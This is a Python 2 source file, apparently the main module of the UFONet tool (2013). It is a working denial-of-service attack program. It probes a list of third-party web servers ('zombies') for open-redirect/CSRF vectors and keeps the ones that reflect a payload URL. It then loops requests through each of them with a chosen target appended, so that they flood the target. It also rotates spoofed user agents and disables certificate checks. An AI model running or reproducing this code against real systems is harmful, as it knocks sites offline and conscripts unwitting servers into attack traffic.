#!/usr/bin/env python
# -*- coding: iso-8859-15 -*-
"""
UFONet - DDoS attacks via Web Abuse (XSS/CSRF) - 2013 - by psy

You should have received a copy of the GNU General Public License along
with masxssive; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import os, sys, re, traceback, random
import pycurl, StringIO, urllib
from urlparse import urlparse
from options import UFONetOptions
DEBUG = 1

class UFONet(object):
    def __init__(self):
        self.agents = []
        self.agents.append('Mozilla/5.0 (iPhone; U; CPU iOS 2_0 like Mac OS X; en-us)')
        self.agents.append('Mozilla/5.0 (Linux; U; Android 0.5; en-us)')
        self.agents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)')
        self.agents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.13 (KHTML, like Gecko) Chrome/0.2.149.29 Safari/525.13')
        self.agents.append('Opera/9.25 (Windows NT 6.0; U; en)')
        self.agents.append('Mozilla/2.02E (Win95; U)')
        self.agents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
        self.agents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
        self.agents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5)')
        self.agents.append('(Privoxy/1.0)')
        self.agents.append('CERN-LineMode/2.15')
        self.agents.append('cg-eye interactive')
        self.agents.append('China Local Browser 2.6')
        self.agents.append('ClariaBot/1.0')
        self.agents.append('Comos/0.9_(robot@xyleme.com)')
        self.agents.append('Crawler@alexa.com')
        self.agents.append('DonutP; Windows98SE')
        self.agents.append('Dr.Web (R) online scanner: http://online.drweb.com/')
        self.agents.append('Dragonfly File Reader')
        self.agents.append('Eurobot/1.0 (http://www.ayell.eu)')
        self.agents.append('FARK.com link verifier')
        self.agents.append('FavIconizer')
        self.agents.append('Feliz - Mixcat Crawler (+http://mixcat.com)')
        self.agents.append('TwitterBot (http://www.twitter.com)')
        self.user_agent = random.choice(self.agents).strip()

        self.referer = 'http://127.0.0.1'

    def set_options(self, options):
        self.options = options

    def create_options(self, args=None):
        self.optionParser = UFONetOptions()
        self.options = self.optionParser.get_options(args)
        if not self.options:
            return False
        return self.options

    def banner(self):
        print '='*75, "\n"
        print "888     888 8888888888 .d88888b.  888b    888          888    "   
        print "888     888 888        d88P" "Y888b  8888b   888          888    "
        print "888     888 888       888     888 88888b  888          888    "
        print "888     888 8888888   888     888 888Y88b 888  .d88b.  888888 "
        print "888     888 888       888     888 888 Y88b888 d8P  Y8b 888    "
        print "888     888 888       888     888 888  Y88888 88888888 888    "
        print "Y88b. .d88P 888       Y88b. .d88P 888   Y8888 Y8b.     Y88b.  "
        print " 'Y88888P'  888        'Y88888P'  888    Y888  'Y8888   'Y8888"       
        print self.optionParser.description, "\n"
        print '='*75

    def try_running(self, func, error, args=None):
        options = self.options
        args = args or []
        try:
            return func(*args)
        except Exception as e:
            print(error, "error")
            if DEBUG:
                traceback.print_exc()

    def run(self, opts=None):
        if opts:
            options = self.create_options(opts)
            self.set_options(options)
        options = self.options

        # check proxy options
        proxy = options.proxy
        if options.proxy:
            try:
                pattern = 'http[s]?://(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5]):[0-9][0-9][0-9][0-9]'
                m = re.search(pattern, proxy)
                if m is None:
                    self.banner()
                    print ("\n[Error] - Proxy malformed!\n")
                    sys.exit(2)
            except Exception:
                self.banner()
                print ("\n[Error] - Proxy malformed!\n")
                sys.exit(2)

        # test web 'zombie' servers -> show statistics
        if options.test:
            try:
                self.banner()
                zombies = self.extract_zombies()
                test = self.testing(zombies)
            except Exception:
                print ("\n[Error] - Something wrong testing!\n")

        # attack target -> exploit CSRF massively and connect all vulnerable servers to a target
        if options.target:
            try:
                self.banner()
                zombies = self.extract_zombies()
                attack = self.attacking(zombies)
            except Exception:
                print ("\n[Error] - Something wrong attacking!\n")

    def extract_zombies(self):
        # extract targets from file (ex: 'zombies.txt')
        options = self.options
        if options.test:
            try:
                f = open(options.test)
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to retrieve 'zombies' from the file."
                    sys.exit(2)
                else:
                    return zombies
            except:
                if os.path.exists(options.test) == True:
                    print '\n[Error] - Cannot open:', options.test, "\n"
                    sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', options.test, "\n"
                    sys.exit(2)
        else:
            try:
                f = open('zombies.txt')
                zombies = f.readlines()
                zombies = [ zombie.replace('\n','') for zombie in zombies ]
                f.close()
                if not zombies:
                    print "\n[Error] - Imposible to retrieve 'zombies' from the file."
                    sys.exit(2)
                else:
                    return zombies
            except:
                if os.path.exists('zombies.txt') == True:
                    print '\n[Error] - Cannot open:', 'zombies.txt', "\n"
                    sys.exit(2)
                else:
                    print '\n[Error] - Cannot found:', 'zombies.txt', "\n"
                    sys.exit(2)

    def update_zombies(self, zombies_ready):
        # update targets on file (ex: 'zombies.txt')
        options = self.options
        if options.test:
            f = open(options.test, "w")
            for zombie in zombies_ready:
                f.write(zombie + os.linesep)
            f.close()

    def head_connection(self, zombie):
        options = self.options
        # try a HEAD connection to the target
        c = pycurl.Curl()
        c.setopt(pycurl.NOBODY,1) # HEAD
        c.setopt(pycurl.URL, zombie)
        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
        if options.agent:
            c.setopt(pycurl.USERAGENT, options.agent)
        else:
            c.setopt(pycurl.USERAGENT, self.user_agent)
        if options.referer:
            c.setopt(pycurl.REFERER, options.referer)
        else:
            c.setopt(pycurl.REFERER, self.referer)
        c.setopt(pycurl.FOLLOWLOCATION, 1)
        c.setopt(pycurl.SSL_VERIFYHOST, 0)
        c.setopt(pycurl.SSL_VERIFYPEER, 0)
        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
        if options.proxy:
            c.setopt(pycurl.PROXY, options.proxy)
        else:
            c.setopt(pycurl.PROXY, '')
        b = StringIO.StringIO()
        c.setopt(pycurl.HEADERFUNCTION, b.write)
        h = StringIO.StringIO()
        c.setopt(pycurl.WRITEFUNCTION, h.write)
        c.perform()
        code_reply = c.getinfo(pycurl.HTTP_CODE)
        reply = b.getvalue()
        if options.verbose:
            print "Reply:"
            print "\n", reply
        c.close()
        return code_reply

    def payload_connection(self, z):
        payload = z + "http://www.google.com" #XSS/CSRF payload	
        options = self.options
        # check if CSRF vulnerability is allowed
        c = pycurl.Curl()
        c.setopt(pycurl.NOBODY,0) # GET
        c.setopt(pycurl.URL, payload)
        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
        if options.agent:
            c.setopt(pycurl.USERAGENT, options.agent)
        else:
            c.setopt(pycurl.USERAGENT, self.user_agent)
        if options.referer:
            c.setopt(pycurl.REFERER, options.referer)
        else:
            c.setopt(pycurl.REFERER, self.referer)
        c.setopt(pycurl.FOLLOWLOCATION, 1)
        c.setopt(pycurl.SSL_VERIFYHOST, 0)
        c.setopt(pycurl.SSL_VERIFYPEER, 0)
        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
        if options.proxy:
            c.setopt(pycurl.PROXY, options.proxy)
        else:
            c.setopt(pycurl.PROXY, '')
        b = StringIO.StringIO()
        c.setopt(pycurl.HEADERFUNCTION, b.write)
        h = StringIO.StringIO()
        c.setopt(pycurl.WRITEFUNCTION, h.write)
        c.perform()
        payload_reply = h.getvalue()
        if options.verbose:
            print "Reply:"
            print "\n", payload_reply
        return payload_reply

    def testing(self, zombies):
        # test CSRF vulnerabilities on webapps and show statistics
        # HTTP HEAD check
        print ("Are 'they' alive? :-) (HEAD Check):")
        print '='*35
        num_active_zombies = 0
        num_failed_zombies = 0
        active_zombies = []
        army = 0
        print "Trying:", len(zombies)
        print '-'*21
        for zombie in zombies:
            t = urlparse(zombie)
            if zombie.startswith("http://") or zombie.startswith("https://"):
                # send HEAD connection
                code_reply = str(self.head_connection(zombie))
                if code_reply == "200" or code_reply == "302" or code_reply == "301" or code_reply == "401":
                    name_zombie = t.netloc
                    print "Zombie:", name_zombie
                    print "Status: Ok ["+ code_reply + "]"
                    num_active_zombies = num_active_zombies + 1
                    active_zombies.append(zombie)
                elif code_reply == "403":
                    print "Zombie:", t.netloc
                    print "Status: Forbidden ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
                else:
                    print "Zombie:", t.netloc
                    print "Status: Not Allowed ["+ code_reply + "]"
                    num_failed_zombies = num_failed_zombies + 1
            else:
                if self.options.verbose:
                    print "Reply:", "\n\nNothing!!!!!\n"
                print "Zombie:", zombie
                print "Status: Malformed!"
                num_failed_zombies = num_failed_zombies + 1
            print '-'*10
        print '='*18
        print "OK:", num_active_zombies, "Fail:", num_failed_zombies
        print '='*18
        if num_active_zombies == 0:
            print "\n[INFO] - Update your 'zombies' list!\n"
            sys.exit(2)
        print '='*22
        # check url parameter vectors
        print ("Checking for payloads:")
        print '='*22
        print "Trying:", num_active_zombies
        print '-'*21
        zombies_ready = []
        num_waiting_zombies = 0
        num_disconnected_zombies = 0
        for z in active_zombies:
            t = urlparse(z)
            name_zombie = t.netloc
            payload_zombie = z
            print "Vector:", payload_zombie
            payload_reply = str(self.payload_connection(z))
            if "http://www.google.com" in payload_reply: #CSRF reply
                num_waiting_zombies = num_waiting_zombies + 1
                print "Status:", "Waiting..."
                zombies_ready.append(z)
            else:
                num_disconnected_zombies = num_disconnected_zombies + 1
                print "Status:", "Disconnected..."
            army = army + 1
            print '-'*10
        print '='*18
        print "OK:", num_waiting_zombies, "Fail:", num_disconnected_zombies
        print '='*18
        print '='*18
        # list of 'zombies' ready to attack
        print ("List of 'zombies':")
        print '='*18
        num_active_zombie = 0
        for z in zombies_ready:
            t = urlparse(z)
            name_zombie = t.netloc
            num_active_zombie = num_active_zombie + 1
            if self.options.verbose:
                print "Zombie [", num_active_zombie, "]:", name_zombie
        print '-'*18
        print "Total Army:", num_active_zombie
        print '-'*18
        # update 'zombies' list
        if num_active_zombie == 0:
            print "\n[INFO] - You haven't any 'zombie'. Try to update your list!\n"

        else:
            update_reply = raw_input("Wanna update your list (Y/n)")
            print '-'*25
            if update_reply == "n" or update_reply == "N":
                print "\nBye!\n"
            else:
                self.update_zombies(zombies_ready)
                print "\n[INFO] - Botnet updated! ;-)\n"

    def attacking(self, zombies):
        # Perform a DDoS Web attack against a target, using XSS/CSRF vectors on third party machines (aka 'zombies')
        target = self.options.target
        if target.startswith("http://") or target.startswith("https://"):
            print "Attacking: ", target
            print '='*55, "\n"
            # send XSS/CSRF injection
            reply = self.injection(target, zombies)
        else:
            print "\n[Error] - Target url not valid!\n"

    def injection(self, target, zombies):
        options = self.options
        head_check_here = False
        head_check_external = False
        print '='*21
        print "Round: 'Is target up?'"
        print '='*21
        # send HEAD connection
        try:
            reply = self.head_connection(target)
            if reply:
                print "From here: YES"
                head_check_here = True
            else:
                print "From here: NO"
                head_check_here = False
        except Exception:
            print "\n[Error] - Cannot check if target is up!\n"
            print "From Here: NO"
            head_check_here = False
        print '-'*21
        # check target on third party service (ex: http://www.downforeveryoneorjustme.com)
        try:
            external_service = "http://www.downforeveryoneorjustme.com/"
            c = pycurl.Curl()
            c.setopt(pycurl.NOBODY,0) # GET
            c.setopt(pycurl.URL, external_service + target)
            c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
            if options.agent:
                c.setopt(pycurl.USERAGENT, options.agent)
            else:
                c.setopt(pycurl.USERAGENT, self.user_agent)
            if options.referer:
                c.setopt(pycurl.REFERER, options.referer)
            else:
                c.setopt(pycurl.REFERER, self.referer)
            c.setopt(pycurl.FOLLOWLOCATION, 1)
            c.setopt(pycurl.SSL_VERIFYHOST, 0)
            c.setopt(pycurl.SSL_VERIFYPEER, 0)
            c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
            if options.proxy:
                c.setopt(pycurl.PROXY, options.proxy)
            else:
                c.setopt(pycurl.PROXY, '')
            b = StringIO.StringIO()
            c.setopt(pycurl.HEADERFUNCTION, b.write)
            h = StringIO.StringIO()
            c.setopt(pycurl.WRITEFUNCTION, h.write)
            c.perform()
            data1 = h.getvalue()
            if options.verbose:
                print "Reply:"
                print "\n", data1
            external_reply = data1
            if "It's just you" in external_reply: # parse external service for correct reply
                print "From exterior: YES"
                head_check_external = True
            else:
                print "From exterior: NO"
                head_check_external = False
        except Exception: 
            print "\n[Error] - Cannot check with:", external_service, "if target is up!\n"
            print "From exterior: NO"
            head_check_external = False
        print '-'*21, "\n"
        # ask for start the attack
        if head_check_here == True or head_check_external == True:
            start_reply = raw_input("Your target looks ONLINE!. Wanna start a DDoS attack? (y/N)")
            print '-'*25
            if start_reply == "y" or start_reply == "Y":
                total_rounds = options.rounds # extract number of rounds
                if total_rounds <= "0":
                    total_rounds = 1
                num_round = 1
                num_hits = 0
                # start to attack the target with each zombie
                zombies = self.extract_zombies() # extract zombies from file
                for i in range(0, int(total_rounds)):
                    for zombie in zombies:
                        print '='*30
                        print "Round:", num_round, "| Total:", total_rounds
                        print '='*30
                        t = urlparse(zombie)
                        name_zombie = t.netloc
                        c = pycurl.Curl()
                        c.setopt(pycurl.NOBODY,0) # GET
                        c.setopt(pycurl.URL, zombie + target)
                        c.setopt(pycurl.HTTPHEADER, ['Accept: image/gif, image/x-bitmap, image/jpeg, image/pjpeg', 'Connection: Keep-Alive', 'Content-type: application/x-www-form-urlencoded; charset=UTF-8'])
                        if options.agent:
                            c.setopt(pycurl.USERAGENT, options.agent)
                        else:
                            c.setopt(pycurl.USERAGENT, self.user_agent)
                        if options.referer:
                            c.setopt(pycurl.REFERER, options.referer)
                        else:
                            c.setopt(pycurl.REFERER, self.referer)
                        c.setopt(pycurl.FOLLOWLOCATION, 1)
                        c.setopt(pycurl.SSL_VERIFYHOST, 0)
                        c.setopt(pycurl.SSL_VERIFYPEER, 0)
                        c.setopt(pycurl.SSLVERSION, pycurl.SSLVERSION_SSLv3)
                        if options.proxy:
                            c.setopt(pycurl.PROXY, options.proxy)
                        else:
                            c.setopt(pycurl.PROXY, '')
			b = StringIO.StringIO()
			c.setopt(pycurl.HEADERFUNCTION, b.write)
			h = StringIO.StringIO()
			c.setopt(pycurl.WRITEFUNCTION, h.write)
			c.perform()
                        data1 = h.getvalue()
                        print "Zombie:", name_zombie
                        # target response
                        if options.verbose:
                            print "Reply:"
                            print "\n", data1
                        print "Status: Hit!"
                        num_hits = num_hits + 1
                        print '-'*10
                    num_round = num_round + 1
	            c.close()
                print '='*21
                print "Total hits:", num_hits
                print '='*21
                print "\n[INFO] - Attack completed! ;-)\n"
            else:
                print "\nBye!\n"
        else:
            print "Your target is OFFLINE!?. Or you cannot reach it"
            print '-'*25
            print "\nBye!\n"

if __name__ == "__main__":
    app = UFONet()
    options = app.create_options()
    if options:
        app.set_options(options)
        app.run()
